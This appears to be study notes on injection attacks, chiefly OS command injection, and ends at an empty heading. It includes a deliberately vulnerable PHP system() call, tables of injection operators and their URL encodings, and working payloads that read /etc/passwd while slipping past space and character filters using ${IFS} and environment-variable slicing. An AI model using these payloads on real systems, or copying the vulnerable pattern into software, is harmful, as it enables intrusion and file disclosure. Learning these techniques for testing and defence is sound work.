# Types
- OS Command Injection:
```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```
- Code Injection
- SQL Injection
- Cross-Site Scripting/HTML Injection
# Method
| Injection Operator | Injection Character | URL-Encoded Character |
|--------------------|---------------------|-----------------------|
| Semicolon          | `;`                 | `%3b`                 |
| New Line           | `\n`                | `%0a`                 |
| Tab                | `\t`                | `%09`                 |
| Background         | `&`                 | `%26`                 |
| Pipe               | `\|`                 | `%7c`                 |
| AND                | `&&`                | `%26%26`              |
| OR                 | `\|\|`                | `%7c%7c`              |
| Sub-Shell (lINUX)          | `` `..` ``          | `%60%60`              |
| Sub-Shell (lINUX)          | `$()`                | `%24%28%29`           |
# Commond types
| Injection Type | Operators |
|---|---|
| SQL Injection | `', ;, --, /* */` |
| Command Injection | `; &&` |
| LDAP Injection | `* ( ) & \|` |
| XPath Injection | `' or and not substring concat count` |
| OS Command Injection | `; & \|` |
| Code Injection | `' ; -- /* */ $() ${} #{} %{} ^` |
| Directory Traversal/File Path Traversal | `../ ..\\ %00` |
| Object Injection | `; & \|` |
| XQuery Injection | `' ; -- /* */` |
| Shellcode Injection | `\x \u %u %n` |
| Header Injection | `\n \r \n \r \t %0d %0a %09` |
# Bypassing Space Filters
```bash
# ${IFS}
?ip=127.0.0.1;cat${IFS}/etc/passwd
?ip=127.0.0.1;{ls,-la}
```
# Bypassing Other Blacklisted Characters
## Linux
- Extract "/"
```bash
echo ${PATH:0:1}
echo ${HOME:0:1}
echo ${PWD:0:1}
echo $(tr '!-}' '"-~'<<<[)
```
- Extract ";"
```bash
echo ${LS_COLORS:10:1}
```
- Example
```bash
# ${IFS}
?ip=127.0.0.1${LS_COLORS:10:1}cat${IFS}${PATH:0:1}etc${HOME:0:1}passwd
?ip=127.0.0.1${LS_COLORS:10:1}{ls,-la}
```
## Windows
```bash
# CMD
echo %HOMEPATH:~6,-11%
# PS
$env:HOMEPATH[0]
```
NOTE: We can also use the Get-ChildItem Env
# Bypassing Blacklisted Commands
